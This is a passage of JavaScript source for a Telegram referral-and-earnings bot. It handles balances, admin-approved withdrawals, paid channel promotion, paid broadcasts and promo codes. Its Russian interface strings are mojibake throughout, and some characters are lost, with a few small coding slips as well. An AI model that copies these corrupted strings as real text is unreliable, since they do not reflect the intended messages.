                        bot.sendMessage(chatId, "馃挕 | 袧邪褕 斜芯褌 写芯谢卸械薪 斜褘褌褜 邪写屑懈薪懈褋褌褉邪褌芯褉芯屑 泻邪薪邪谢邪/褔邪褌邪 写谢褟 邪胁褌芯屑邪褌懈褔械褋泻芯泄 锌褉芯胁械褉泻懈 锌芯写锌懈褋芯泻.").catch(() => {});
                        return;
                    }
                    addchannel.set(userId, {
                        hours: addchannel.get(userId).hours,
                        channel: msg.text.trim().replace("@", "").replace("https://t.me/", "").replace("http://t.me/", "").replace("t.me/", "").replace("/", ""),
                        name: chat.title
                    });
                    db.get(`SELECT count(*) as count
                            FROM subscriptions
                            WHERE datetime(creationDate, '+' || hours || ' hours') > datetime('now')`, async (err, row) => {
                        if (err) {
                            log(err);
                            return;
                        }
                        if (!row) return;
                        if (row.count < maxaddedrequiredchannels) {
                            await db.run(`INSERT INTO subscriptions(ownerId, hours, channel, title)
                                          VALUES (?, ?, ?,
                                                  ?)`, [userId, addchannel.get(userId).hours, msg.text.trim().replace("@", "").replace("https://t.me/", "").replace("http://t.me/", "").replace("t.me/", "").replace("/", ""), chat.title]);
                            db.run(`UPDATE users
                                    SET balance = balance + ?
                                    WHERE chatId = ?`, [-(addchannel.get(userId).hours * priceperhour), userId], err1 => {
                                if (err1) {
                                    log(err1);
                                    return;
                                }
                                addchannel.delete(userId);
                                bot.sendMessage(chatId, '鉁� 袣邪薪邪谢 褍褋锌械褕薪芯 写芯斜邪胁谢械薪!').catch(() => {});
                            });
                        } else {
                            bot.sendMessage(chatId, "鉂晐 校卸械 写芯斜邪胁谢械薪芯 屑邪泻褋懈屑邪谢褜薪芯械 泻芯谢懈褔械褋褌胁芯 泻邪薪邪谢芯胁 写谢褟 锌芯写锌懈褋泻懈. 袩芯写芯卸写懈褌械, 锌芯泻邪 写芯斜邪胁谢械薪懈械 薪械 褋褌邪薪械褌 褋薪芯胁邪 写芯褋褌褍锌薪芯", {
                                parse_mode: 'HTML'
                            }).catch(() => {});
                        }
                    });
                }
            } else if (broadcasts.has(userId)) {
                if (!broadcasts.get(userId).auditory) {
                    if (isNaN(msg.text)) {
                        bot.sendMessage(chatId, "馃挕 | 袧褍卸薪芯 胁胁械褋褌懈 褔懈褋谢芯").catch(() => {});
                        return;
                    }
                    const auditory = parseInt(msg.text);

                    broadcasts.set(userId, {
                        auditory: auditory,
                        msg: undefined
                    });
                    bot.sendMessage(chatId, "鉁忥笍 | 袨褌锌褉邪胁褜褌械 褋芯芯斜褖械薪懈械 写谢褟 褉邪褋褋褘谢泻懈").catch(() => {});
                } else {
                    broadcasts.set(userId, {
                        auditory: broadcasts.get(userId).auditory,
                        msg: msg
                    });
                    broadcastMessageConfirm(msg, userId);
                }
            } else if (orderbroadcasts.has(userId)) {
                if (!orderbroadcasts.get(userId).auditory) {
                    if (isNaN(msg.text)) {
                        bot.sendMessage(chatId, "鉂晐 袧褍卸薪芯 胁胁械褋褌懈 褔懈褋谢芯").catch(() => {});
                        return;
                    }
                    const auditory = parseInt(msg.text);
                    db.get(`SELECT balance
                            FROM users
                            WHERE chatId = ?`, [userId], (err, row) => {
                        if (err) {
                            log(err);
                            return;
                        }
                        if (!row) return;
                        if (row.balance < auditory * priceperuser) {
                            bot.sendMessage(chatId, "鉂曅澬敌葱狙佈傂把傂狙囆窖嬓� 斜邪谢邪薪褋. 袩褉芯胁械褉褜褌械 胁褋械 写邪薪薪褘械 懈 锌芯胁褌芯褉懈褌械 锌芯锌褘褌泻褍.").catch(() => {});
                            return;
                        }
                        orderbroadcasts.set(userId, {
                            auditory: auditory,
                            msg: undefined
                        });
                        bot.sendMessage(chatId, "鉁忥笍 | 袨褌锌褉邪胁褜褌械 褋芯芯斜褖械薪懈械 写谢褟 褉邪褋褋褘谢泻懈").catch(() => {});
                    });
                } else {
                    orderbroadcasts.set(userId, {
                        auditory: orderbroadcasts.get(userId).auditory,
                        msg: msg
                    });
                    broadcastMessageConfirm(msg, userId, true);
                }
            } else if (adminfuncs.has(userId)) {
                if (!admin.includes(userId)) return;
                switch (adminfuncs.get(userId).func) {
                    case "changebalance": {
                        const user = msg.text.split(" ")[0];
                        const dif = msg.text.split(" ")[1];
                        adminfuncs.delete(userId);
                        db.run(`UPDATE users
                                SET balance = balance + ?
                                WHERE chatId = ?`, [parseFloat(dif), parseInt(user)]);
                        db.get(`SELECT balance, username, firstName
                                FROM users
                                WHERE chatId = ?`, [parseInt(user)], (err, row) => {
                            if (err) {
                                log(err);
                                return;
                            }
                            if (!row) {
                                bot.sendMessage(chatId, "袩芯谢褜蟹芯胁邪褌械谢褜 薪械 薪邪泄写械薪").catch(() => {});
                            } else {
                                bot.sendMessage(chatId, `袘邪谢邪薪褋 锌芯谢褜蟹芯胁邪褌械谢褟 ${row.username ? '@' + row.username : row.firstName} 懈蟹屑械薪褢薪 薪邪 ${dif}褉.\n袧芯胁褘泄 斜邪谢邪薪褋: ${row.balance}`, {parse_mode: "HTML"}).catch(() => {});
                            }
                        });
                        break;
                    }
                }
            } else if (adminreferals.has(userId)) {
                adminreferals.delete(userId);
                if (!admin.includes(userId)) return;
                if (!isNaN(msg.text)) {
                    db.all(`SELECT *
                            FROM users
                            WHERE referer = ?
                            LIMIT 100`, [parseInt(msg.text)], (err, rows) => {
                        if (err) {
                            log(err);
                            return;
                        }
                        if (rows.length === 0) {
                            bot.sendMessage(chatId, "袪械褎械褉邪谢褘 薪械 薪邪泄写械薪褘").catch(() => {});
                            return;
                        }
                        let text = '';
                        rows.forEach(row => {
                            text += '<b>' + row.chatId + '</b> (' + row.firstName + ') ' + (row.username ? '@' + row.username + ' ' : '') + (row.verified === 1 ? '鉁�' : '鉂�') + ' <b>' + row.balance.toFixed(2) + '鈧�</b>\n'
                        })
                        bot.sendMessage(chatId, "袪械褎械褉邪谢褘 锌芯谢褜蟹芯胁邪褌械谢褟 (锌械褉胁褘械 " + rows.length + ") 鈩�" + msg.text + ":\n" + text, {parse_mode: 'HTML'}).catch(() => {});
                    })
                } else {
                    bot.sendMessage(chatId, "袧褍卸薪芯 胁胁械褋褌懈 褔懈褋谢芯.").catch(() => {});
                }
            } else if (promocodes.has(userId)) {
                promocodes.delete(userId);
                db.get(`SELECT *
                        FROM promocodes p
                        WHERE p.hash = ?
                          AND p.hash NOT IN (SELECT hash FROM promocodeactivations WHERE userId = ?)
                          AND p.activations >
                              (SELECT count(*) FROM promocodeactivations WHERE hash = p.hash)`, [msg.text, userId], async (err, row) => {
                    if (err || !row) {
                        bot.sendMessage(chatId, "袩褉芯屑芯泻芯写 薪械 薪邪泄写械薪 懈谢懈 褍卸械 邪泻褌懈胁懈褉芯胁邪薪").catch(() => {});
                        return;
                    }
                    db.run(`INSERT OR IGNORE INTO promocodeactivations(userId, hash)
                            VALUES (?, ?)`, [userId, msg.text]);
                    db.run(`UPDATE users
                            SET balance = balance + ?
                            WHERE chatId = ?`, [row.sum, userId]);
                    await bot.sendMessage(userId, '鉁� 袩褉芯屑芯泻芯写 邪泻褌懈胁懈褉芯胁邪薪: <b>+' + row.sum.toFixed(2) + ' ' + config.currency + '</b>', {parse_mode: 'HTML'}).catch(() => {});
                    await bot.sendMessage(admin[0], '鈿� 袩褉芯屑芯泻芯写 <b>' + msg.text + '</b> 邪泻褌懈胁懈褉芯胁邪薪 锌芯谢褜蟹芯胁邪褌械谢械屑 <b>' + userId + '</b>', {parse_mode: 'HTML'}).catch((err) => {
                        log(err.message)
                    });
                })
            } else if (adminpromocode.has(userId)) {
                if (!admin.includes(userId)) return;
                const promo = adminpromocode.get(userId);
                if (!promo.sum) {
                    if (isNaN(msg.text)) {
                        bot.sendMessage(chatId, "鉂晐 袧褍卸薪芯 胁胁械褋褌懈 褔懈褋谢芯").catch(() => {});
                        return;
                    }
                    promo.sum = parseFloat(msg.text);
                    await bot.sendMessage(userId, '馃挕 | 袙胁械写懈褌械 泻芯谢懈褔械褋褌胁芯 邪泻褌懈胁邪褑懈泄:');
                } else if (!promo.activations) {
                    if (isNaN(msg.text)) {
                        bot.sendMessage(chatId, "鉂晐 袧褍卸薪芯 胁胁械褋褌懈 褔懈褋谢芯").catch(() => {});
                        return;
                    }
                    promo.activations = parseInt(msg.text);
                    promo.hash = makeid(8);
                    db.run(`INSERT INTO promocodes (hash, activations, sum)
                            VALUES (?, ?, ?)`, [promo.hash, promo.activations, promo.sum], async (err) => {
                        if (err) {
                            log(err);
                            return;
                        }
                        await bot.sendMessage(userId, `袩褉芯屑芯泻芯写 薪邪 褋褍屑屑褍 ${promo.sum.toFixed(2)} ${config.currency} 懈 ${promo.activations} 邪泻褌懈胁邪褑懈泄 褋芯蟹写邪薪: <code>` + promo.hash + '</code>', {parse_mode: 'HTML'});
                        adminpromocode.delete(userId);
                    })
                }
            }
        }
    }
})

bot.on('callback_query', async (msg) => {
    if (msg) {
        const userId = msg.from.id;
        const chatId = msg.message.chat.id;
        log(userId + ' 芯褌锌褉邪胁懈谢 芯斜褉邪褌薪褍褞 褋胁褟蟹褜: ' + msg.data);

        const data = msg.data.split('_');
        switch (data[0]) {
            case 'withdraw': {
                db.get(`SELECT *
                        FROM users
                        WHERE chatId = ?`, [userId], (err, row) => {
                    if (err) {
                        log(err);
                        return;
                    }
                    if (!row) return;
                    if (row.balance < minAmount) {
                        bot.sendMessage(chatId, "鉂曅溞感�. 褋褍屑屑邪 胁褘胁芯写邪: " + minAmount).catch(() => {});
                        return;
                    }
                    withdraws.set(userId, {amount: undefined, wallet: undefined});
                    bot.sendMessage(chatId, "馃挕 | 袙胁械写懈褌械 褋褍屑屑褍 芯褌 " + minAmount + " 写芯 " + row.balance + ":").catch(() => {});
                });
                break;
            }
            case 'replenish': {
                bot.sendMessage(chatId, config.replenish.replaceAll("{id}", userId), {parse_mode: 'HTML'}).catch(() => {});
                break;
            }
            case 'withdraws': {
                if (admin.includes(userId)) {
                    if (data[1] && data[1] === "skip") current_withdraw_offset++;
                    else current_withdraw_offset = 0;
                    db.get(`SELECT count(*) as count
                            FROM withdraws
                            WHERE status = 0`, (err2, row2) => {
                        if (err2) {
                            log(err2);
                            return;
                        }
                        const count = row2.count;
                        if (count === 0) {
                            bot.sendMessage(chatId, "鉂曅澬笛� 蟹邪褟胁芯泻 薪邪 胁褘锌谢邪褌褍").catch(() => {});
                            return;
                        }
                        if (current_withdraw_offset >= count) current_withdraw_offset = count - 1;
                        db.get(`SELECT *
                                FROM withdraws
                                WHERE status = 0
                                LIMIT 1 OFFSET ?`, [current_withdraw_offset], (err1, row1) => {
                            if (err1) {
                                log(err1);
                                return;
                            }
                            if (row1)
                                db.get(`SELECT *
                                        FROM users
                                        WHERE chatId = ?`, [row1.chatId], (err, row) => {
                                    if (err) {
                                        log(err);
                                        return;
                                    }
                                    if (!row) return;
                                    bot.sendMessage(chatId, `袙褋械谐芯 蟹邪褟胁芯泻 薪邪 胁褘锌谢邪褌褍: ${count}\n袩褉芯锌褍褖械薪芯: ${current_withdraw_offset}\n\n袩芯谢褜蟹芯胁邪褌械谢褜: ${row.username ? '@' + row.username : row.firstName}\n小褍屑屑邪: ${row1.amount}\n袪械泻胁懈蟹懈褌褘: <code>${row1.wallet}</code>`,
                                        {
                                            parse_mode: 'HTML',
                                            reply_markup: {
                                                inline_keyboard: [
                                                    [
                                                        {
                                                            text: '鈴� 袩褉芯锌褍褋褌懈褌褜',
                                                            callback_data: 'withdraws_skip'
                                                        }
                                                    ],
                                                    [
                                                        {
                                                            text: '鉁� 袙褘锌谢邪褌懈褌褜',
                                                            callback_data: 'acceptwithdraw_' + row1.id
                                                        }
                                                    ],
                                                    [
                                                        {
                                                            text: '鉂� 袨褌泻邪蟹邪褌褜',
                                                            callback_data: 'declinewithdraw_' + row1.id
                                                        }
                                                    ]
                                                ]
                                            }
                                        }
                                    ).catch(() => {});
                                });
                        });
                    });
                }
                break;
            }
            case 'acceptwithdraw': {
                if (!admin.includes(userId)) return;
                const id = parseInt(data[1]);
                db.get(`SELECT *
                        FROM withdraws
                        WHERE id = ?
                          AND status = 0`, [id], (err, row) => {
                    if (err) {
                        log(err);
                        return;
                    }
                    if (!row) return;
                    db.run(`UPDATE withdraws
                            SET status = 1
                            WHERE id = ?`, [id]);
                    bot.sendMessage(row.chatId, "鉁� 袙邪褕邪 蟹邪褟胁泻邪 薪邪 胁褘胁芯写 斜褘谢邪 褍褋锌械褕薪芯 芯斜褉邪斜芯褌邪薪邪. \n\n小褍屑屑邪 " + row.amount + " 褍褋锌械褕薪芯 胁褘锌谢邪褔械薪邪 薪邪 褉械泻胁懈蟹懈褌褘:" + row.wallet).catch(() => {});
                    bot.sendMessage(config.withdraws, `馃拵 <b><a href="tg://user?id=${row.chatId}">锌芯谢褜蟹芯胁邪褌械谢褜</a> 胁褘胁械谢 ${row.amount} ${config.currency}</b>`, {parse_mode: 'HTML'}).catch(() => {});
                    bot.sendMessage(admin[0], "小芯芯斜褖械薪懈械 芯斜 褍褋锌械褕薪芯泄 胁褘锌谢邪褌械 芯褌锌褉邪胁谢械薪芯.", {
                        reply_markup: {
                            inline_keyboard: [[{
                                text: '馃摛 袟邪褟胁泻懈 薪邪 胁褘锌谢邪褌褍',
                                callback_data: 'withdraws'
                            }]]
                        }
                    }).catch(() => {});
                });
                break;
            }
            case 'declinewithdraw': {
                if (!admin.includes(userId)) return;
                const id = parseInt(data[1]);
                db.get(`SELECT *
                        FROM withdraws
                        WHERE id = ?
                          AND status = 0`, [id], (err, row) => {
                    if (err) {
                        log(err);
                        return;
                    }
                    if (!row) return;
                    db.run(`UPDATE withdraws
                            SET status = 2
                            WHERE id = ?`, [id]);
                    db.run(`UPDATE users
                            SET balance = balance + ?
                            WHERE chatId = ?`, [row.amount, row.chatId])
                    bot.sendMessage(row.chatId, row.amount + " 薪械 斜褘谢芯 胁褘锌谢邪褔械薪芯 薪邪 " + row.wallet).catch(() => {});
                    bot.sendMessage(admin[0], "小芯芯斜褖械薪懈械 芯 薪械胁褘锌谢邪褌械 芯褌锌褉邪胁谢械薪芯", {
                        reply_markup: {
                            inline_keyboard: [[{
                                text: '馃摛 袟邪褟胁泻懈 薪邪 胁褘锌谢邪褌褍',
                                callback_data: 'withdraws'
                            }]]
                        }
                    }).catch(() => {});
                });
                break;
            }
            case 'addchannel': {
                db.get(`SELECT count(*) as count
                        FROM subscriptions
                        WHERE datetime(creationDate, '+' || hours || ' hours') > datetime('now')`, (err, row) => {
                    if (err) {
                        log(err);
                        return;
                    }
                    if (!row) return;
                    if (row.count < maxaddedrequiredchannels) {
                        addchannel.set(userId, {
                            hours: undefined,
                            channel: undefined,
                            name: undefined
                        });
                        bot.sendMessage(chatId, "馃挕 | 袨褌锌褉邪胁褜褌械 褋褉芯泻, 薪邪 泻芯褌芯褉褘泄 褏芯褌懈褌械 蟹邪泻邪蟹邪褌褜 锌褉芯写胁懈卸械薪懈械 (胁 褔邪褋邪褏).").catch(() => {});
                    } else
                        bot.sendMessage(chatId, "校锌褋.. 校卸械 写芯斜邪胁谢械薪芯 屑邪泻褋懈屑邪谢褜薪芯械 泻芯谢懈褔械褋褌胁芯 泻邪薪邪谢芯胁 写谢褟 锌芯写锌懈褋泻懈. 袩芯写芯卸写懈褌械, 锌芯泻邪 写芯斜邪胁谢械薪懈械 薪械 褋褌邪薪械褌 褋薪芯胁邪 写芯褋褌褍锌薪芯", {
                            parse_mode: 'HTML'
                        }).catch(() => {});
                });
                break;
            }
            case 'listchannels': {
                db.all(`SELECT *
                        FROM subscriptions
                        WHERE datetime(creationDate, '+' || hours || ' hours') > datetime('now')
                          AND ownerId = ?`, [userId], (err, rows) => {
                    if (err) {
                        log(err);
                        return;
                    }
                    if (!rows) return;
                    if (rows.length > 0) {
                        let message = "袙邪褕懈 泻邪薪邪谢褘:"
                        for (const row of rows) {
                            message += "\n@" + row.channel + " 袛邪褌邪 褋芯蟹写邪薪懈褟: " + row.creationDate + " 小褉芯泻: " + row.hours + " 褔邪褋芯胁";
                        }
                        bot.sendMessage(chatId, message).catch(() => {});
                    } else
                        bot.sendMessage(chatId, "袧械褌 泻邪薪邪谢芯胁", {
                            parse_mode: 'HTML'
                        }).catch(() => {});
                });
                break;
            }
            case 'broadcast': {
                if (admin.includes(userId)) {
                    if (data[1]) {
                        if (data[1] === 'confirm') {
                            const msg = JSON.parse(JSON.stringify(broadcasts.get(userId).msg));
                            const auditory = JSON.parse(JSON.stringify(broadcasts.get(userId).auditory));
                            bot.sendMessage(chatId, "鉁� 袪邪褋褋褘谢泻邪 蟹邪锌褍褖械薪邪").catch(() => {});
                            broadcastMessage(msg, auditory);
                            broadcasts.delete(userId);
                        } else {
                            bot.sendMessage(chatId, "袨褌屑械薪械薪芯").catch(() => {});
                            broadcasts.delete(userId);
                        }
                    } else {
                        broadcasts.set(userId, {
                            auditory: undefined,
                            msg: undefined
                        });
                        bot.sendMessage(chatId, "鈿栵笍 袙胁械写懈褌械 邪褍写懈褌芯褉懈褞 (泻芯谢懈褔械褋褌胁芯 褔械谢芯胁械泻):").catch(() => {});
                    }
                }
                break;
            }
            case 'orderbroadcast': {
                if (data[1]) {
                    if (data[1] === 'confirm') {
                        db.get(`SELECT balance
                                FROM users
                                WHERE chatId = ?`, [userId], (err, row) => {
                            if (err) {
                                log(err);
                                return;
                            }
                            if (!row) return;
                            if (row.balance < orderbroadcasts.get(userId).auditory * priceperuser) {
                                bot.sendMessage(chatId, "鉂椥澬敌葱狙佈傂把傂狙囆窖嬓� 斜邪谢邪薪褋").catch(() => {});
                                orderbroadcasts.delete(userId);
                                return;
                            }
                            db.run(`UPDATE users
                                    SET balance = balance - ?
                                    WHERE chatId = ?`, [orderbroadcasts.get(userId).auditory * priceperuser, userId]);
                            broadcastMessage(orderbroadcasts.get(userId).msg, orderbroadcasts.get(userId).auditory, userId);
                            setTimeout(() => {
                                orderbroadcasts.delete(userId);
                            }, 1000);
                        });
                    } else {
                        bot.sendMessage(chatId, "袨褌屑械薪械薪芯").catch(() => {});
                        orderbroadcasts.delete(userId);
                    }
                } else {
                    orderbroadcasts.set(userId, {
                        auditory: undefined,
                        msg: undefined
                    });
                    bot.sendMessage(chatId, "鈿栵笍 袙胁械写懈褌械 邪褍写懈褌芯褉懈褞 (泻芯谢懈褔械褋褌胁芯 褔械谢芯胁械泻).\n孝械泻褍褖懈泄 泻褍褉褋: " + priceperuser + +" " + config.currency + " 蟹邪 褔械谢芯胁械泻邪").catch(() => {});
                }
                break;
            }
            case 'changebalance': {
                if (admin.includes(userId)) {
                    adminfuncs.set(userId, {
                        func: "changebalance"
                    });
                    bot.sendMessage(chatId, "馃挕 | 袙胁械写懈褌械 ID 锌芯谢褜蟹芯胁邪褌械谢褟 懈 褋褍屑屑褍, 薪邪 泻芯褌芯褉褍褞 薪褍卸薪芯 懈蟹屑械薪懈褌褜 斜邪谢邪薪褋 褔械褉械蟹 锌褉芯斜械谢\n袧邪锌褉懈屑械褉: 1234567890 -10.5").catch(() => {});
                }
                break;
            }
            case 'editchannels': {
                if (admin.includes(userId)) {
                    db.all(`SELECT *
                            FROM subscriptions
                            WHERE datetime(creationDate, '+' || hours || ' hours') > datetime('now')`, (err, rows) => {
                        if (err) {
                            log(err);
                            return;
                        }
                        if (!rows) return;
                        let keyboard = [];
                        for (const row of rows) {
                            keyboard.push([{text: row.title, callback_data: 'editchannel_' + row.id}]);
                        }
                        bot.sendMessage(chatId, "馃攷 孝械泻褍褖懈械 泻邪薪邪谢褘:", {reply_markup: {inline_keyboard: keyboard}}).catch(() => {});
                    });
                }
                break;
            }
            case 'editchannel': {
                if (admin.includes(userId)) {
                    db.get(`SELECT *
                            FROM subscriptions
                            WHERE id = ?`, [parseInt(data[1])], (err, row) => {
                        if (err) {
                            log(err);
                            return;
                        }
                        if (!row) return;
                        bot.sendMessage(chatId, "袟邪谐芯谢芯胁芯泻: " + row.title + "\n袣邪薪邪谢: https://t.me/" + row.channel, {
                            reply_markup: {
                                inline_keyboard: [[{
                                    text: '馃棏锔� 校写邪谢懈褌褜',
                                    callback_data: 'deletechannel_' + row.id
                                }]]
                            }
                        }).catch(() => {});
                    });
                }
                break;
            }
            case 'deletechannel': {
                if (admin.includes(userId)) {
                    db.run(`DELETE
                            FROM subscriptions
                            WHERE id = ?`, [parseInt(data[1])]);
                    bot.sendMessage(chatId, "馃棏锔� 袣邪薪邪谢 褍写邪谢褢薪").catch(() => {});
                }
                break;
            }
            case 'reftop': {
                switch (data[1]) {
                    case 'all': {
                        db.all(`SELECT u1.id,
                                       u1.firstName,
                                       u1.username,
                                       u1.referer,
                                       COUNT(u2.referer) AS referer_count
                                FROM users u1
                                         LEFT JOIN
                                     users u2 ON u1.chatId = u2.referer
                                GROUP BY u1.id,
                                         u1.chatId,
                                         u1.firstName,
                                         u1.username,
                                         u1.referer
                                ORDER BY referer_count DESC
                                LIMIT 10;
                        `, (err, rows) => {
                            if (err) {
                                log(err);
                                return;
                            }
                            let message = '馃弳 孝芯锌 褉械褎械褉邪谢芯胁 蟹邪 胁褋褢 胁褉械屑褟:\n';
                            for (const row of rows) {
                                message += `\n${row.referer_count} - ${(row.username ? ' @' + row.username : row.firstName)}`;
                            }
                            bot.sendMessage(userId, message).catch((err) => {
                                log(err)
                            });
                        });
                        break;
                    }
                    case 'day': {
                        db.all(`SELECT u1.id,
                                       u1.firstName,
                                       u1.username,
                                       u1.referer,
                                       COUNT(u2.referer) AS referer_count
                                FROM users u1
                                         LEFT JOIN
                                     users u2 ON u1.chatId = u2.referer
                                         AND u2.registrationDate >= DATETIME('now', '-1 day')
                                GROUP BY u1.id,
                                         u1.firstName,
                                         u1.username,
                                         u1.referer
                                ORDER BY referer_count DESC
                                LIMIT 10;
                        `, (err, rows) => {
                            if (err) {
                                log(err);
                                return;
                            }
                            let message = '馃弲 孝芯锌 褉械褎械褉邪谢芯胁 蟹邪 褋械谐芯写薪褟:\n';
                            for (const row of rows) {
                                message += `\n${row.referer_count} - ${(row.username ? ' @' + row.username : row.firstName)}`;
                            }
                            bot.sendMessage(userId, message).catch((err) => {
                                log(err)
                            });
                        });
                        break;
                    }
                }
                break;
            }
            case 'adminreferals': {
                adminreferals.set(userId, {});
                await bot.sendMessage(userId, '袙胁械写懈褌械 ID 锌芯谢褜蟹芯胁邪褌械谢褟 写谢褟 锌褉芯褋屑芯褌褉邪:')
                break;
            }
            case 'adminpromocode': {
                adminpromocode.set(userId, {});
                await bot.sendMessage(userId, '鉁� 袙胁械写懈褌械 褋褍屑屑褍 锌褉芯屑芯泻芯写邪:')
                break;
            }
        }
    }
    bot.answerCallbackQuery(msg.id).catch((err) => {
        log(err.message)
    });
});
let current_withdraw_offset = 0;

function broadcastMessage(msg, auditory = null, firstChatId = admin[0], order = false) {
    const text = (msg.text || msg.caption || '');
    const form = {};
    if (msg.entities) {
        form.entities = JSON.stringify(msg.entities);
    }
    if (msg.caption) {
        form.caption = text;
    }
    if (msg.caption_entities) {
        form.caption_entities = JSON.stringify(msg.caption_entities);
    }
    const delay = time => new Promise(resolve => setTimeout(resolve, time));
    db.all(`SELECT chatId
            FROM users${auditory ? ' ORDER BY RANDOM() LIMIT ' + auditory : ''}`, async (err, rows) => {
        if (err) {
            log('Error fetching user data:', err);
            return;
        }
        const msg_b = createButtonsFromTemplate(text, form);
        const msg_b_form = msg_b.form;
        let counter = 0;
        if (msg.text) {
            let msg_b_text = msg_b.text;
            if (order) msg_b_text = "锔�#褉械泻谢邪屑邪\n" + msg_b_text;
            for (const row of rows) {
                bot.sendMessage(row.chatId, msg_b_text, msg_b_form).catch(() => {
                    counter++;
                }).catch(() => {});
                await delay(100);
            }
        }
        if (msg.photo) {
            const photo = msg.photo[0].file_id;
            for (const row of rows) {
                bot.sendPhoto(row.chatId, photo, msg_b_form).catch(() => {
                    counter++;
                });
                await delay(100);
            }
        }
        bot.sendMessage(firstChatId, '鉁� 袪邪褋褋褘谢泻邪 蟹邪胁械褉褕械薪邪').catch(() => {});
        bot.sendMessage(admin[0], '馃毄 袧械 写芯褋褌邪胁谢械薪芯: ' + counter).catch(() => {});
    });
}

function broadcastMessageConfirm(msg, userId, order = false) {
    const text = (msg.text ? msg.text : (msg.caption ? msg.caption : null));
    const form = {};
    if (msg.entities) {
        form.entities = JSON.stringify(msg.entities);
    }
    if (msg.caption) {
        form.caption = text;
    }
    if (msg.caption_entities) {
        form.caption_entities = JSON.stringify(msg.caption_entities);
    }

    const msg_b = createButtonsFromTemplate(text, form);
    const msg_b_form = msg_b.form;
    if (order)
        msg_b_form.reply_markup.inline_keyboard.push([{
            text: '袩芯写褌胁械褉写懈褌褜',
            callback_data: 'orderbroadcast_confirm'
        }, {text: '袨褌泻谢芯薪懈褌褜', callback_data: 'orderbroadcast_decline'}]);
    else
        msg_b_form.reply_markup.inline_keyboard.push([{
            text: '袩芯写褌胁械褉写懈褌褜',
            callback_data: 'broadcast_confirm'
        }, {text: '袨褌泻谢芯薪懈褌褜', callback_data: 'broadcast_decline'}]);
    let counter = 0;
    if (msg.text) {
        const msg_b_text = msg_b.text;
        bot.sendMessage(userId, msg_b_text, msg_b_form).catch(() => {
            counter++;
        }).catch(() => {});
    }
    if (msg.photo) {
        const photo = msg.photo[0].file_id;
        bot.sendPhoto(userId, photo, msg_b_form).catch(() => {
            counter++;
        });
    }
}

function createButtonsFromTemplate(message, form) {
    const buttonRegex = /#([^#]+)#([^#]+)#/g;
    let match;
    const keyboardButtons = [];

    while ((match = buttonRegex.exec(message)) !== null) {
        const buttonName = match[1];
        const buttonUrl = match[2];
        keyboardButtons.push([{text: buttonName, url: buttonUrl}]);
    }

    const keyboard = {
        inline_keyboard: keyboardButtons,
    };
    const text = message.replace(buttonRegex, '');
    const options = {...form, reply_markup: keyboard};
    if (options.caption) {
        options.caption = text;
    }
    return {text: text, form: options};
}

bot.on('polling_error', (error) => {
    log('Polling error:', error);
});

process.on('SIGTERM', () => {
    process.exit();
})
